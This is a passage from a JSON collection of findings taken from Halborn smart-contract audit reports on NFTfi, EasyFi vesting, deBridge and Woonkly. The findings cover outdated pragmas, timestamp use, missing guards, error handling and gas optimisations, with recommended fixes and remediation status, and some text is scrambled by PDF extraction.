PermittedAirdrop  Properly manage the ownership  Critical functions such as setAirdroptPermit and setAirdroptPermits are guarded. 16 S I S Y L A N A L A U N A M 4.4 PermittedNFTsAndTypeRegistry It is used to register a valid NFT in the NFTfi system. The contract will be used to access NFT wrappers and register new NFT types and permits.  Critical functions are protected by the owner  A critical function is protected by using onlyOwnerOrAirdropFactory instead of onlyOwner. Backtracking the ownership relationship does verify that the check is safe. AirdropFactory is cloning new airdrops templates. However, those templates will not have permissions on the PermittedNFTsAndTypeRegistry contract. 4.5 nftTypeRegistry/nftTypes They are registered under the PermittedNFTsAndTypeRegistry contract and used with the AirdropReceiver contract to wrap the underlying NFT assets. All registered wrappers should not contain any storage variable. They are used by performing a delegatecall to the underlying wrapped contract and do not require new storage variables; otherwise, a variable collision could occur. Currently, all contracts present in nftTypeRegistry do not hold any new storage variables, which makes them compatible with the delegate calling system. 4.6 SmartNFT All operations are restricted to the LOAN_COORDINATOR_ROLE which is ex- pected to be for the DirectLoanCoordinator contract only. However, the transfer is allowed to anyone. As an example, the obligation token can be transferred to the lender: 17 S I S Y L A N A L A U N A M S I S Y L A N A L A U N A M 18 CALL GRAPH AND INHERITANCE 19 AirdropFlashLoan: E C N A T I R E H N I D N A H P A R G L L A C Figure 1: airdrop/AirdropFlashLoan.sol 20 AirdropFlashLoan_target_nftWrapperLegendINftfiHubReentrancyGuard<Constructor>INftfiHubpullAirdrop_transferNFT_getSelectorIPermittedAirdropsIERC1155IERC721functionCallgetContractsupportsInterfacetypesupportsInterfaceINftWrapperfunctionDelegateCallInternal CallExternal CallDefined ContractUndefined Contract AirdropReceiver: E C N A T I R E H N I D N A H P A R G L L A C Figure 2: airdrop/AirdropReceiver.sol 21 AirdropReceiver_nftTransferWrapperIERC1155ReentrancyGuardLegendIERC721IERC20_targetINftfiHubonlyOwnergetTokenIdownerOfonlyOwnerOrBeneficiary<Constructor>INftfiHub_safeMintinitializewrap_transferNFTIPermittedNFTsgetContractunwrappullAirdrop_getSelectorIPermittedAirdropsfunctionCallsupportsInterfacetypesupportsInterfacedrainERC20AirdropIERC20balanceOfsafeTransferdrainERC721AirdropIERC721safeTransferFromdrainERC1155AirdropIERC1155balanceOfsafeTransferFromINftWrapperfunctionDelegateCallonERC721Received_receiveAndWraponERC1155ReceivedonERC1155BatchReceivedInternal CallExternal CallDefined ContractUndefined Contract DirectLoanBaseMinimal: E C N A T I R E H N I D N A H P A R G L L A C Figure 3: loans/direct/loanTypes/DirectLoanBaseMinimal.sol 22 DirectLoanBaseMinimalIERC1155IERC721INftfiHubIERC20LegendIDirectLoanCoordinatorLoanChecksAndCalculationsAddressLoanAirdropUtilsNFTfiSigningUtils<Constructor>_setERC20PermitINftfiHubupdateMaximumLoanDurationtypeupdateAdminFeedrainERC20AirdropIERC20balanceOfsafeTransfersetERC20PermitsetERC20PermitsdrainERC721AirdropIERC721ownerOfsafeTransferFromdrainERC1155AirdropIERC1155balanceOfsafeTransferFrommintObligationReceiptIDirectLoanCoordinatorgetContractmintObligationReceiptrenegotiateLoan_renegotiateLoanpayBackLoan_payBackLoan_resolveLoan_getPartiesAndDatapayBackChecksliquidateOverdueLoancheckLoanIdValiditypullAirdroppullAirdropwrapCollateralwrapCollateralcancelLoanCommitmentBeforeLoanHasBegungetPayoffAmountgetWhetherNonceHasBeenUsedForUsergetERC20PermitSignatureownerrenegotiationCheckscomputeAdminFeeisValidLenderRenegotiationSignature_createLoan_createLoanNoNftTransfer_transferNFTregisterLoancomputeReferralFeeINftWrapperfunctionDelegateCall_payoffAndFeecomputeRevenueShare_resolveLoanNoNftTransferresolveLoan_loanSanityChecksgetLoanDataobligationReceiptTokenpromissoryNoteToken_setupLoanExtrasLoanExtrasgetRevenueSharePercent_getWrapperIPermittedNFTsInternal CallExternal CallDefined ContractUndefined Contract DirectLoanFixedOffer: E C N A T I R E H N I D N A H P A R G L L A C Figure 4: loans/direct/loanTypes/DirectLoanFixedOffer.sol 23 DirectLoanFixedOfferLegendContractKeyshubLoanChecksAndCalculations<Constructor>getIdFromStringKeyacceptOffer_acceptOffer_setupLoanTerms_loanSanityChecksOffer_getWrapper_loanSanityChecks_setupLoanExtrasgetPayoffAmount_createLoanLoanStartedgetContractLoanTerms_payoffAndFeecomputeAdminFeeInternal CallExternal CallDefined ContractUndefined Contract DirectLoanCoordinator: E C N A T I R E H N I D N A H P A R G L L A C Figure 5: loans/direct/DirectLoanCoordinator.sol 24 DirectLoanCoordinatorContractKeysLegendonlyInitialized<Constructor>_registerLoanTypesINftfiHubinitializeregisterLoangetContractFromTypeLoanSmartNftmintObligationReceiptgetTypeFromContractresolveLoangetLoanDataisValidLoanIdregisterLoanType_registerLoanTyperegisterLoanTypesgetIdFromStringKeyInternal CallExternal CallDefined ContractUndefined Contract SmartNFT: E C N A T I R E H N I D N A H P A R G L L A C Figure 6: smartNFT/SmartNFT.sol 25 SmartNftAccessControlLegend<Constructor>_setBaseURI_setupRoleINftfiHubsetLoanCoordinatorgrantRolemint_safeMintburn_burnsetBaseURIexists_existssupportsInterfacesupportsInterface_getChainID_baseURIInternal CallExternal CallDefined ContractUndefined Contract NFTfiBundler: E C N A T I R E H N I D N A H P A R G L L A C Figure 7: composable/NFTfiBundler.sol 26 NftfiBundlerERC998ERC20ExtensionIPermittedERC20sIPermittedNFTsLegendINftfiHub<Constructor>INftfiHubsupportsInterfacetypesupportsInterfacepermittedAssetIPermittedNFTsgetNFTPermitgetContractpermittedErc20AssetIPermittedERC20sgetERC20PermitbuildBundle_safeMintIERC721_getChild_getERC20IERC1155decomposeBundleownerOf_validateReceiver_remove1155ChildTransfer1155Child_removeChild_oldNFTsTransferTransferChild_removeERC20IERC20TransferERC20_receiveChild_receiveChild_receive1155Child_receive1155Child_receiveErc20Child_receiveErc20ChildInternal CallExternal CallDefined ContractUndefined Contract ",
        "labels": [
            "Halborn",
            "NFTfi_Ethereum",
            "Severity: Informational"
        ]
    },
    {
        "title": "TOKENVESTING CONTRACT OUTDATED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Access_Vesting_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "TokenVesting is used by Stater team with pragma 0.5.17. However, the contract was removed from OpenZeppelin contracts package. In addition, the latest version of the contract before being removed uses the pragma version 0.6.0. References: Vesting Discussion Last TokenVesting version Code Location: accessVesting.sol: Lines #204 #362 Listing 1: accessVesting.sol (Lines 204) 202 // File : browser / TokenVesting . sol 203 204 pragma solidity 0.5.17; 205 206 Listing 2: accessVesting.sol (Lines 362) 360 // File : browser / VestingFactory . sol 361 362 pragma solidity 0.5.17; 363 364 13 Risk Level: Likelihood - 4 Impact - 2 Recommendation: If possible, it is recommended other alternatives to use the token locking capability such as the use of EIP-1132 (Extending ERC20 with token locking capability) and Time-locked Wallets. If not possible, it is recommended to use the latest version. References: (eip-1132)[https://eips.ethereum.org/EIPS/eip-1132] (Time Locked WalletTruffle Tutorial)[https://www.toptal.com/ethereum- smart-contract/time-locked-wallettruffle-tutorial] Remediation Plan: SOLVED: EasyFi team updated the pragma to the version 0.7.6. Listing 3: accessVesting.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity 0.7.6; 4 5 /* * 6 14 ",
        "labels": [
            "Halborn",
            "EasyFi_Access_Vesting",
            "Severity: Medium"
        ]
    },
    {
        "title": "PRAGMA VERSION DEPRECATED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Access_Vesting_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "for accessVesting.sol. The current version in use for the contracts is pragma =0.5.17 and 0.5.2 While this version is still functional, and most security issues safely implemented by mitigating contracts with other utility contracts such as SafeMath.sol and ReentrancyGuard.sol, the risk to the long-term sustainability and integrity of the solidity code increases. Code Location: Listing 4: accessVesting.sol (Lines 80) 76 // File : browser / Address . sol 77 78 // File : openzeppelin - solidity / contracts / utils / Address . sol 79 80 pragma solidity ^0.5.2; 81 82 /* * 83 84 * Utility library of inline functions on addresses */ Listing 5: accessVesting.sol (Lines 204) 202 // File : browser / TokenVesting . sol 203 204 pragma solidity 0.5.17; 205 206 207 208 209 210 /* * 211 * @title TokenVesting 15 212 * @dev A token holder contract that can release its token balance gradually like a 213 * typical vesting scheme , with a cliff and vesting period . Optionally revocable by the * owner . */ 214 215 216 contract TokenVesting { Risk Level: Likelihood - 1 Impact - 3 Recommendations: At the time of this audit, the current version is already at 0.8.6. When possible, use the most updated and tested pragma versions to take advantage of new features that provide checks and accounting, as well as prevent insecure use of code (0.6.12-0.7.6). Remediation Plan: SOLVED: EasyFi team updated the pragma to the version 0.7.6. Listing 6: accessVesting.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity 0.7.6; 4 5 /* * 6 16 ",
        "labels": [
            "Halborn",
            "EasyFi_Access_Vesting",
            "Severity: Low"
        ]
    },
    {
        "title": "FLOATING PRAGMA AND VERSION MISMATCH",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Access_Vesting_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "Smart contract accessVesting.sol uses the floating pragma ^0.5.2 in some of the libraries inside, while using floating pragma ^0.5.17 in other libraries inside the smart contract, Contracts should be deployed with the same compiler version and flags used during development and testing. Locking the pragma helps to ensure that contracts do not accidentally For example, an outdated pragma get deployed using another pragma. version might introduce bugs that affect the contract system negatively or security recently vulnerabilities. versions released unknown pragma have may Code Location: Listing 7: version 0.5.2 (Lines 80) 76 // File : browser / Address . sol 77 78 // File : openzeppelin - solidity / contracts / utils / Address . sol 79 80 pragma solidity ^0.5.2; 81 82 /* * 83 84 * Utility library of inline functions on addresses */ Listing 8: version 0.5.17 (Lines 204) 202 // File : browser / TokenVesting . sol 203 204 pragma solidity 0.5.17; 17 Risk Level: Likelihood - 1 Impact - 3 Recommendations: Consider locking the pragma version. It is not recommended to use a floating pragma in production. Apart from just locking the pragma version in the code, the sign (>=) need to be removed. It is possible to lock the pragma by fixing the version both in truffle-config.js for Truffle framework or in hardhat.config.js for HardHat framework. Remediation Plan: SOLVED: EasyFi team locked the pragma to the version 0.7.6. Listing 9: accessVesting.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity 0.7.6; 4 5 /* * 6 18 ",
        "labels": [
            "Halborn",
            "EasyFi_Access_Vesting",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF BLOCK.TIMESTAMP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Access_Vesting_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "The During a manual review, we noticed the use of block.timestamp. contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of block.timestamp creates a risk that miners could perform time manipulation to influence price oracles. Miners can modify the timestamp by up to 900 seconds. Code Location: accessVesting.sol Lines #253 #351 #353 #356 #416 #417 #424 19 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of Maximal Extractable Value (MEV) attacks. Check if the timescale of the If project occurs across years, days and months rather than seconds. possible, it is recommended to use Oracles. Remediation Plan: NOT APPLICABLE: EasyFi team assumes the use of block.timestamp is safe since the timescales is higher than 900 seconds. 20 ",
        "labels": [
            "Halborn",
            "EasyFi_Access_Vesting",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF RELEASE FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Access_Vesting_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "When a beneficiary wants to vest tokens, the smart contract creates another contract which is used to hold the vested token, whenever a beneficiary wants to release this tokens given specific conditions are met , he can call the release() function to transfer the tokens back to the beneficiary. It was observed that the release function is public and there is no checks that the function caller is the actual beneficiary or not, there are no loss of funds as the tokens are sent back to the beneficiary and not the user who called the function (msg.sender) Code Location: Listing 10: accessVesting.sol (Lines 319) /* * * @notice Transfers vested tokens to beneficiary . */ function release () public { uint256 unreleased = _releasableAmount () ; require ( unreleased > 0) ; uint256 sTokensToRelease = unreleased . mul ( multiplier ). div (10000) ; _released [ mainToken ] = _released [ mainToken ]. add ( unreleased ); _released [ secondaryToken ] = _released [ secondaryToken ]. add ( sTokensToRelease ); IERC20 ( mainToken ). safeTransfer ( _beneficiary , unreleased ); 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 21 IERC20 ( secondaryToken ). safeTransferFrom ( factory , _beneficiary , sTokensToRelease ); emit TokensReleased ( unreleased , sTokensToRelease ); 332 333 334 335 336 } Risk Level: Likelihood - 1 Impact - 1 Recommendations: Consider adding onlyBeneficiary which contains below sample code. Listing 11: onlyBeneficiary Modifier (Lines 2) 1 2 3 4 modifier onlyBeneficiary () { require ( msg . sender == beneficiary ) _ } Remediation Plan: ACKNOWLEDGED: EasyFi considers that this is intended behavior to be able to allow beneficiary to release their tokens even from another address, at the end the tokens are only released to the beneficiary address. 22 ",
        "labels": [
            "Halborn",
            "EasyFi_Access_Vesting",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Access_Vesting_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdraw function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against reentrancy attacks. Risk Level: Likelihood - 1 Impact - 1 Recommendation: In the accessVesting.sol contract, function like release(), is missing nonReentrant guard. Use the nonReentrant modifier to avoid introducing future vulnerabilities. Remediation Plan: ACKNOWLEDGED: EasyFi team accepts the risk and nonReentrant modifier will not be added due to the fact that all state changes are happening before the transfer calls 23 ",
        "labels": [
            "Halborn",
            "EasyFi_Access_Vesting",
            "Severity: Informational"
        ]
    },
    {
        "title": "NO TEST COVERAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Access_Vesting_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "Unlike traditional software, smart contracts can not be modified unless deployed using a proxy contract. Because of the permanence, unit tests and functional testing are recommended to ensure the code works correctly before deployment. Mocha and Chai are valuable tools to perform unit tests in smart contracts. Mocha is a Javascript testing framework for creating synchronous and asynchronous unit tests, and Chai is a library with assertion functionality such as assert or expect and should be used to develop custom unit tests. References: https://github.com/mochajs/mocha https://github.com/chaijs/chai https://docs.openzeppelin.com/learn/writing-automated-tests Risk Level: Likelihood - 1 Impact - 2 Recommendation: We recommend performing as many test cases as possible to cover all conceivable scenarios in the smart contract. Remediation Plan: SOLVED: Unit tests were added to the test directory including many test cases such as: - makings transfers exceeding the current balance - releasing tokens before the end of vesting period. 24 - Tesitng the vest() function which creates another contract of type tokenVesting. Listing 12: Sample Unit Test Added (Lines 42,43,44) 28 it ( \" Expect Revert - Vest \" , async function () { 29 30 31 access . connect ( addr2 ). vest (1000) await expect ( ). to . be . revertedWith ( \" ERC20 : transfer amount exceeds balance \" ); await network . provider . send (\" evm_increaseTime \" , [5184001]) await network . provider . send (\" evm_mine \" ) await expect ( access . connect ( addr2 ). vest (1000) ). to . be . revertedWith ( \" release time is before current time \" ); let maxVesting = await access . maxVesting () ; maxVesting = maxVesting + 1; await expect ( access . connect ( addr2 ). vest ( maxVesting ) ). to . be . revertedWith ( \" Breaching max vesting limit \"); }) 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 25 ",
        "labels": [
            "Halborn",
            "EasyFi_Access_Vesting",
            "Severity: Informational"
        ]
    },
    {
        "title": "DOCUMENTATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Access_Vesting_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "For The documentation provided by the EasyFi team is not complete. instance, the documentation included in the GitHub repository should include a walkthrough to deploy and test the smart contracts. Recommendation: Consider updating the documentation in Github for greater ease when contracts are deployed and tested. Have a Non-Developer or QA resource work through the process to make sure it addresses any gaps in the set-up steps due to technical assumptions. Remediation Plan: SOLVED: Documentation has been added to the README.md 26 ",
        "labels": [
            "Halborn",
            "EasyFi_Access_Vesting",
            "Severity: Informational"
        ]
    },
    {
        "title": "USAGE OF VULNERABLE CRATES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/deBridge_Solana_Contracts_Solana_Program_Security_Audit_Report_Halborn.pdf",
        "body": "It was observed that the project uses crates with known vulnerabilities. Code Location: ID RUSTSEC-2020-0036 package failure short description unmaintained Risk Level: Likelihood - 4 Impact - 1 Recommendation: Even if those vulnerable crates cannot impact the underlying application, it is advised to be aware of them. Also, it is necessary to set up dependency monitoring to always be alerted when a new vulnerability is disclosed in one of the project crates. Remediation Plan: RISK ACCEPTED: The DeBridge team accepted the risk of this finding. 12 ",
        "labels": [
            "Halborn",
            "deBridge_Solana_Contracts_Solana_Program",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING PROPER ERROR HANDLING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/deBridge_Solana_Contracts_Solana_Program_Security_Audit_Report_Halborn.pdf",
        "body": "The function deserialize() is using unwrap() methods which are resulting in T but if instead there will be E or None result, then it will panic. Code Location: Listing 1: crates/signature-verifier/src/lib.rs (Lines 229,231) 205 impl <' instr > RecoverInstruction < ' instr > { 206 pub fn deserialize ( buf : & mut & ' instr [ u8 ], ix_index : u8 ) -> io  :: Result < Self > { 207 208 209 210 211  1]; 212 213 214 const SERIALIZED_SIZE : usize = 11; let count = buf [0] as usize ; let offsets : Vec < SecpSignatureOffsets > = { let mut buf : &[ u8 ] = & buf [1.. count * SERIALIZED_SIZE + (0.. count ) . map (| _ | { let offset = bincode :: deserialize :: <  SecpSignatureOffsets >( buf ) 215 . map_err (| err | io :: Error :: new ( io ::  ErrorKind :: InvalidInput , err )) ?; 216 217 218 219 220 221 222 223 224 225 buf = & buf [ SERIALIZED_SIZE ..]; Ok ( offset ) }) . take ( count ) . collect :: < io :: Result < Vec <_ > > >() }?; Ok ( Self { signatures : offsets . into_iter () . filter (| offset | offset . message_instruction_index .  eq (& ix_index )) 226 . filter (| offset | offset .  eth_address_instruction_index . eq (& ix_index )) 13 227 . filter (| offset | offset .  signature_instruction_index . eq (& ix_index )) 228 229 . map (| offset | SignatureContext :: < ' instr > { address : buf [ offset . get_eth_address_range () ].  try_into () . unwrap () , 230 231 msg : & buf [ offset . get_message_range () ], signature : buf [ offset . get_signature_range () ].  try_into () . unwrap () , 232 recovery_id : & buf [ offset .  get_recovery_id_offset () ], }) . collect :: < Vec <_ > >() , 233 234 235 236 237 } }) } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to change all unwrap() methods to unwrap_or() or ? in production environment. Remediation Plan: ACKNOWLEDGED: The DeBridge team acknowledged this finding. 14 ",
        "labels": [
            "Halborn",
            "deBridge_Solana_Contracts_Solana_Program",
            "Severity: Informational"
        ]
    },
    {
        "title": "FUNCTION ERC721WOONKLYNFTREVEALWAVE.CHANGEHIDDENBASEURI MODIFIES THE WRONG STATE VARIABLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Woonkly_NFT_protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The contracts ERC721WoonklyNFTRevealWave, ERC1155WoonklyNFTRevealWave function ERC721WoonklyNFTMinimalRevealWave contain and the changeHiddenBaseURI(): Listing 1: ERC721WoonklyNFTRevealWave.sol (Line 125) 119 function changeHiddenBaseURI ( 120 121 122 ) public onlyOwner { 123 uint _waveId , string memory _baseURI require ( bytes ( _baseURI ). length > 0, \" Error : Input parameters  can not be empty ( string ) \" ); 124 125 126 } RevealWave storage revealWave = waves [ _waveId ]; revealWave . revealBaseURI = _baseURI ; As we can see in the code above, the function is modifying the revealBaseURI variable instead of the hiddenBaseURI. As the name of the function indicates, this is not correct. Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended to modify the changeHiddenBaseURI() function, so it updates the hiddenBaseURI variable instead of the revealBaseURI in the 12 contracts ERC721WoonklyNFTRevealWave, ERC1155WoonklyNFTRevealWave and ERC721WoonklyNFTMinimalRevealWave. Remediation Plan: SOLVED: The Woonkly team modified the changeHiddenBaseURI() function as suggested. 13 ",
        "labels": [
            "Halborn",
            "Woonkly_NFT_protocol",
            "Severity: Low"
        ]
    },
    {
        "title": "REVEALWAVE.REVEALDATE IS NOT USED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Woonkly_NFT_protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The contracts ERC721WoonklyNFTRevealWave, ERC1155WoonklyNFTRevealWave and ERC721WoonklyNFTMinimalRevealWave contain the following struct: Listing 2: ERC721WoonklyNFTRevealWave.sol (Line 21) 15 16 17 18 19 20 21 22 struct RevealWave { bool isRevealed ; string name ; string hiddenBaseURI ; bool addTokenURIToHiddenBaseURI ; string revealBaseURI ; uint revealDate ; } The revealDate parameter is not used anywhere in the code and provides no utility, for this reason, it can be removed from the struct. There is only a setter function that can also be removed: Listing 3: ERC721WoonklyNFTRevealWave.sol (Line 152) 147 function changeRevealDate ( uint _waveId , 148 uint _revealDate 149 150 ) public onlyOwner { 151 152 153 } RevealWave storage revealWave = waves [ _waveId ]; revealWave . revealDate = _revealDate ; Risk Level: Likelihood - 1 Impact - 1 14 Recommendation: It is recommended to remove the revealDate variable from the RevealWave struct. It is also recommended to remove the setter function changeRevealDate() in the contracts ERC721WoonklyNFTRevealWave, ERC1155WoonklyNFTRevealWave and ERC721WoonklyNFTMinimalRevealWave. Remediation Plan: SOLVED: The Woonkly team removed the revealDate variable from the RevealWave struct. The setter function changeRevealDate() was also removed. 15 ",
        "labels": [
            "Halborn",
            "Woonkly_NFT_protocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNNEEDED INITIALIZATION OF UINT256 VARIABLES TO 0",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Woonkly_NFT_protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "As i is an uint256, it is already initialized to 0. reassigns the 0 to i which wastes gas. uint256 i = 0 Code Location: ERC721LazyMinimal.sol - Line 59: 85:for (uint i = 0; i < _creators.length; i++) { for (uint i = 0; i < data.creators.length; i++){`` - Line WoonklyNFTTransferManager.sol - Line 165: for (uint256 i = 0; i < fees.length; i++){`` - Line 184:for (uint256 i = 0; i < payouts.length - 1; i++) {- Line 206:for (uint256 i = 0; i < orderOriginFees.length; i++) { ERC1155Lazy.sol - Line 70: for (uint i = 0; i < data.creators.length; i++){ - Line 117: for (uint i = 0; i < _creators.length; i++){ ERC1155Base.sol - Line 31: for (uint i = 0; i < ids.length; i++){ ERC1155Upgradeable.sol - Line 119: for (uint256 i = 0; i < accounts.length; ++i){ - Line 200: for (uint256 i = 0; i < ids.length; ++i){ - Line 280: for (uint i = 0; i < ids.length; i++){ - Line 327: for (uint i = 0; i < ids.length; i++){ RoyaltiesRegistry.sol - Line 99: for (uint i = 0; i < royalties.length; i++){ - Line 225: for (uint256 i = 0; i < values.length; i++){ 16 ERC721Lazy.sol - Line 63: for (uint i = 0; i < data.creators.length; i++){ - Line 99: for (uint i = 0; i < _creators.length; i++){ ERC721WoonklyNFTRevealWave.sol - Line 47: for (uint256 i = 0; i < operators.length; i++){ Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to not initialize uint256 variables to 0 to save some gas. For example, use instead: for (uint256 i; i < operators.length; ++i){. Remediation Plan: SOLVED: The Woonkly team removed the initialization of uint256 variable to 0 in the for loops mentioned reducing the gas costs. 17 ",
        "labels": [
            "Halborn",
            "Woonkly_NFT_protocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "USING ++I CONSUMES LESS GAS THAN I++ IN LOOPS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Woonkly_NFT_protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the loop below, the variable i is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. Code Location: ERC721LazyMinimal.sol - Line 59: 85:for (uint i = 0; i < _creators.length; i++) { for (uint i = 0; i < data.creators.length; i++){`` - Line WoonklyNFTTransferManager.sol - Line 165: for (uint256 i = 0; i < fees.length; i++){`` - Line 184:for (uint256 i = 0; i < payouts.length - 1; i++) {- Line 206:for (uint256 i = 0; i < orderOriginFees.length; i++) { ERC1155Lazy.sol - Line 70: for (uint i = 0; i < data.creators.length; i++){ - Line 117: for (uint i = 0; i < _creators.length; i++){ ERC1155Base.sol - Line 31: for (uint i = 0; i < ids.length; i++){ ERC1155Upgradeable.sol - Line 280: for (uint i = 0; i < ids.length; i++){ - Line 327: for (uint i = 0; i < ids.length; i++){ RoyaltiesRegistry.sol - Line 99: for (uint i = 0; i < royalties.length; i++){ - Line 225: for (uint256 i = 0; i < values.length; i++){ 18 ERC721Lazy.sol - Line 63: for (uint i = 0; i < data.creators.length; i++){ - Line 99: for (uint i = 0; i < _creators.length; i++){ ERC721WoonklyNFTRevealWave.sol - Line 47: for (uint256 i = 0; i < operators.length; i++){ Risk Level: Likelihood - 1 Impact - 1 Proof of Concept: For example, based in the following test contract: Listing 4: Test.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.9; 3 4 contract test { 5 6 7 8 9 10 11 12 13 } } function postiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; i ++) { } } function preiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; ++ i) { } We can see the difference in the gas costs: 19 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of an uint variable inside a loop. This does not only apply to the iterator variable. It also applies to increments done inside the loop code block. Remediation Plan: SOLVED: The Woonkly team uses now ++i instead of i++ to increment the iterator variable in for loops reducing the gas costs. 20 ",
        "labels": [
            "Halborn",
            "Woonkly_NFT_protocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Woonkly_NFT_protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contracts below contracts, there are some functions marked as public that are never called directly within the contract itself or in any of their descendants: ProxyAdmin.sol - getProxyImplementation() (ProxyAdmin.sol#19-31) - getProxyAdmin() (ProxyAdmin.sol#37-49) - changeProxyAdmin() (ProxyAdmin.sol#56-61) - upgrade() (ProxyAdmin.sol#68-73) - upgradeAndCall() (ProxyAdmin.sol#84-90) ERC721WoonklyNFTRevealWave.sol - setRevealWave() (ERC721WoonklyNFTRevealWave.sol#104-117) - changeHiddenBaseURI() (ERC721WoonklyNFTRevealWave.sol#119-126) - changeAddTokenURIToHiddenBaseURI() (ERC721WoonklyNFTRevealWave.sol#128-134) - changeRevealBaseURI() (ERC721WoonklyNFTRevealWave.sol#136-145) - changeRevealDate() (ERC721WoonklyNFTRevealWave.sol#147-153) - resetIsRevealedAndRevealURI() (ERC721WoonklyNFTRevealWave.sol#155-161) - changeName() (ERC721WoonklyNFTRevealWave.sol#164-171) - mintAndTransferReveal() (ERC721WoonklyNFTRevealWave.sol#233-243) ERC721WoonklyNFTMinimalRevealWave.sol - setRevealWave() (ERC721WoonklyNFTMinimalRevealWave.sol#70-83) - changeHiddenBaseURI() (ERC721WoonklyNFTMinimalRevealWave.sol#85-92) - changeAddTokenURIToHiddenBaseURI() (ERC721WoonklyNFTMinimalRevealWave.sol#94-100) - changeRevealBaseURI() (ERC721WoonklyNFTMinimalRevealWave.sol#102-111) - changeRevealDate() (ERC721WoonklyNFTMinimalRevealWave.sol#113-119) - resetIsRevealedAndRevealURI() (ERC721WoonklyNFTMinimalRevealWave.sol#121-127) - changeName() (ERC721WoonklyNFTMinimalRevealWave.sol#130-137) - mintAndTransferReveal() (ERC721WoonklyNFTMinimalRevealWave.sol#199-209) ERC721WoonklyNFTFactoryC2.sol 21 - getAddress() (ERC721WoonklyNFTFactoryC2.sol#61-73) - getAddress() (ERC721WoonklyNFTFactoryC2.sol#80-92) ERC721WoonklyNFTRevealWaveFactoryC2.sol - getAddress() (ERC721WoonklyNFTRevealWaveFactoryC2.sol#64-76) - getAddress() (ERC721WoonklyNFTRevealWaveFactoryC2.sol#83-95) ERC1155WoonklyNFTRevealWave.sol - setRevealWave() (ERC1155WoonklyNFTRevealWave.sol#72-85) - changeHiddenBaseURI() (ERC1155WoonklyNFTRevealWave.sol#87-94) - changeAddTokenURIToHiddenBaseURI() (ERC1155WoonklyNFTRevealWave.sol#96-102) - changeRevealBaseURI() (ERC1155WoonklyNFTRevealWave.sol#104-113) - changeRevealDate() (ERC1155WoonklyNFTRevealWave.sol#115-121) - resetIsRevealedAndRevealURI() (ERC1155WoonklyNFTRevealWave.sol#123-129) - changeName() (ERC1155WoonklyNFTRevealWave.sol#132-139) - assignRevealWaveIdToTokenId() (ERC1155WoonklyNFTRevealWave.sol#142-145) ERC1155WoonklyNFTFactoryC2.sol - getAddress() (ERC1155WoonklyNFTFactoryC2.sol#63-75) - getAddress() (ERC1155WoonklyNFTFactoryC2.sol#82-94) 